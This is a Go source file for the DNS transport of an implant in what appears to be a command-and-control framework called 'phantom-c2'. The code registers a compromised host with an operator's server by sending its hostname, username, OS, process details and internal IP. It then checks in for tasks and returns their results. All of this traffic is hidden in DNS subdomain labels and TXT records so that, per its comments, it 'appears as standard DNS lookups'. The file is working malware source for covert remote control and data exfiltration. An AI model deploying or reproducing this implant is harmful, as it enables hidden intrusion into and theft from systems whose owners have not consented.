package implant

import (
	"crypto/rsa"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
)

// DNSTransport handles C2 communication over DNS queries.
// All traffic appears as standard DNS lookups.
//
// Outbound (agent → server): Data encoded as Base32 in subdomain labels
//   e.g., MFZW.K3TU.NFSM.c2domain.com
//
// Inbound (server → agent): Data encoded as Base64 in TXT records

const (
	dnsQueryTimeout = 10 * time.Second
	dnsMaxPayload   = 180 // Max bytes per DNS query (after base32 encoding fits in labels)
)

// DNSTransport implements C2 comms over DNS.
type DNSTransport struct {
	domain     string // C2 domain (e.g., "c2.example.com")
	resolver   string // DNS server to query (e.g., "8.8.8.8:53")
	serverPub  *rsa.PublicKey
	sessionKey []byte
	agentID    string
	agentName  string
}

// NewDNSTransport creates a new DNS transport.
func NewDNSTransport(domain string, resolver string, serverPub *rsa.PublicKey) *DNSTransport {
	if resolver == "" {
		resolver = "8.8.8.8:53" // Default to Google DNS
	}
	return &DNSTransport{
		domain:    domain,
		resolver:  resolver,
		serverPub: serverPub,
	}
}

// Register performs agent registration over DNS.
func (t *DNSTransport) Register(sysinfo SysInfo) error {
	sessionKey, err := crypto.GenerateAESKey()
	if err != nil {
		return err
	}

	regReq := protocol.RegisterRequest{
		Hostname:    sysinfo.Hostname,
		Username:    sysinfo.Username,
		OS:          sysinfo.OS,
		Arch:        sysinfo.Arch,
		PID:         sysinfo.PID,
		ProcessName: sysinfo.ProcessName,
		InternalIP:  sysinfo.InternalIP,
	}

	payload, err := protocol.Marshal(regReq)
	if err != nil {
		return err
	}

	encrypted, err := crypto.PackKeyExchange(t.serverPub, sessionKey, payload)
	if err != nil {
		return err
	}

	// Prepend message type
	data := append([]byte{protocol.MsgRegisterRequest}, encrypted...)

	// Send via DNS and get response
	respData, err := t.sendDNSQuery(data)
	if err != nil {
		return err
	}

	if len(respData) < 2 || respData[0] != protocol.MsgRegisterResponse {
		return fmt.Errorf("invalid registration response")
	}

	// Decrypt response
	respPayload, err := crypto.AESDecrypt(sessionKey, respData[1:])
	if err != nil {
		return err
	}

	var regResp protocol.RegisterResponse
	if err := protocol.Unmarshal(respPayload, &regResp); err != nil {
		return err
	}

	t.sessionKey = sessionKey
	t.agentID = regResp.AgentID
	t.agentName = regResp.Name

	return nil
}

// CheckIn sends a check-in over DNS and receives tasks.
func (t *DNSTransport) CheckIn(results []protocol.TaskResult) ([]protocol.Task, error) {
	checkIn := protocol.CheckInRequest{
		AgentID: t.agentID,
		Results: results,
	}

	payload, err := protocol.Marshal(checkIn)
	if err != nil {
		return nil, err
	}

	encrypted, err := crypto.AESEncrypt(t.sessionKey, payload)
	if err != nil {
		return nil, err
	}

	// Build message: [type][keyID][encrypted]
	keyID := crypto.SessionKeyID(t.sessionKey)
	data := make([]byte, 0, 1+8+len(encrypted))
	data = append(data, protocol.MsgCheckIn)
	data = append(data, keyID[:]...)
	data = append(data, encrypted...)

	// Send via DNS
	respData, err := t.sendDNSQuery(data)
	if err != nil {
		return nil, err
	}

	if len(respData) < 2 || respData[0] != protocol.MsgCheckInResponse {
		return nil, nil // No tasks
	}

	respPayload, err := crypto.AESDecrypt(t.sessionKey, respData[1:])
	if err != nil {
		return nil, err
	}

	var checkInResp protocol.CheckInResponse
	if err := protocol.Unmarshal(respPayload, &checkInResp); err != nil {
		return nil, err
	}

	return checkInResp.Tasks, nil
}

// sendDNSQuery encodes data as DNS subdomain labels and queries the C2 domain.
func (t *DNSTransport) sendDNSQuery(data []byte) ([]byte, error) {
	// Base32 encode the data (DNS-safe characters)
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	encoded = strings.ToLower(encoded)

	// Split into DNS labels (max 63 chars each)
	var labels []string
	for len(encoded) > 0 {
		end := 63
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[:end])
		encoded = encoded[end:]
	}

	// Add random subdomain for cache busting
	labels = append(labels, fmt.Sprintf("%08x", rand.Uint32()))

	// Build query domain
	queryDomain := strings.Join(labels, ".") + "." + t.domain + "."

	// Send DNS TXT query
	return t.rawDNSQuery(queryDomain, 16) // 16 = TXT record type
}

// rawDNSQuery sends a raw DNS query and returns the TXT record data.
func (t *DNSTransport) rawDNSQuery(domain string, qtype uint16) ([]byte, error) {
	conn, err := net.DialTimeout("udp", t.resolver, dnsQueryTimeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(dnsQueryTimeout))

	// Build DNS query packet
	txnID := uint16(rand.Intn(65535))
	query := buildDNSQuery(txnID, domain, qtype)

	_, err = conn.Write(query)
	if err != nil {
		return nil, err
	}

	// Read response
	buf := make([]byte, 4096) // Larger buffer for TXT records
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}

	// Parse TXT record from response
	return extractTXTRecord(buf[:n])
}

// buildDNSQuery creates a raw DNS query packet.
func buildDNSQuery(txnID uint16, domain string, qtype uint16) []byte {
	var pkt []byte

	// Header
	pkt = append(pkt, byte(txnID>>8), byte(txnID)) // Transaction ID
	pkt = append(pkt, 0x01, 0x00)                   // Flags: RD=1
	pkt = append(pkt, 0x00, 0x01)                   // QDCOUNT=1
	pkt = append(pkt, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) // AN, NS, AR = 0

	// Question: encode domain name
	labels := strings.Split(strings.TrimSuffix(domain, "."), ".")
	for _, label := range labels {
		pkt = append(pkt, byte(len(label)))
		pkt = append(pkt, []byte(label)...)
	}
	pkt = append(pkt, 0x00) // Root label

	// QTYPE and QCLASS
	pkt = append(pkt, byte(qtype>>8), byte(qtype)) // QTYPE
	pkt = append(pkt, 0x00, 0x01)                   // QCLASS = IN

	return pkt
}

// extractTXTRecord parses the TXT record data from a DNS response.
func extractTXTRecord(data []byte) ([]byte, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("response too short")
	}

	anCount := binary.BigEndian.Uint16(data[6:8])
	if anCount == 0 {
		return nil, fmt.Errorf("no answer records")
	}

	// Skip header (12 bytes) and question section
	offset := 12
	// Skip QNAME
	for offset < len(data) {
		l := int(data[offset])
		if l == 0 {
			offset++
			break
		}
		if l >= 0xC0 { // Pointer
			offset += 2
			break
		}
		offset += 1 + l
	}
	offset += 4 // QTYPE + QCLASS

	// Parse answer records
	for i := uint16(0); i < anCount && offset < len(data); i++ {
		// Skip NAME (may be pointer)
		if offset+2 <= len(data) && data[offset]&0xC0 == 0xC0 {
			offset += 2 // Pointer
		} else {
			for offset < len(data) {
				l := int(data[offset])
				if l == 0 {
					offset++
					break
				}
				offset += 1 + l
			}
		}

		if offset+10 > len(data) {
			break
		}

		rtype := binary.BigEndian.Uint16(data[offset:])
		offset += 8 // TYPE(2) + CLASS(2) + TTL(4)
		rdLen := binary.BigEndian.Uint16(data[offset:])
		offset += 2

		if rtype == 16 && int(rdLen) > 0 && offset+int(rdLen) <= len(data) {
			// TXT record: first byte is string length
			txtLen := int(data[offset])
			if txtLen > 0 && offset+1+txtLen <= len(data) {
				txtData := string(data[offset+1 : offset+1+txtLen])

				// Base64 decode
				decoded, err := crypto.Base64Decode(txtData)
				if err != nil {
					return nil, err
				}
				return decoded, nil
			}
		}

		offset += int(rdLen)
	}

	return nil, fmt.Errorf("no TXT record found")
}

// GetAgentID returns the assigned agent ID.
func (t *DNSTransport) GetAgentID() string {
	return t.agentID
}

// GetAgentName returns the assigned agent name.
func (t *DNSTransport) GetAgentName() string {
	return t.agentName
}
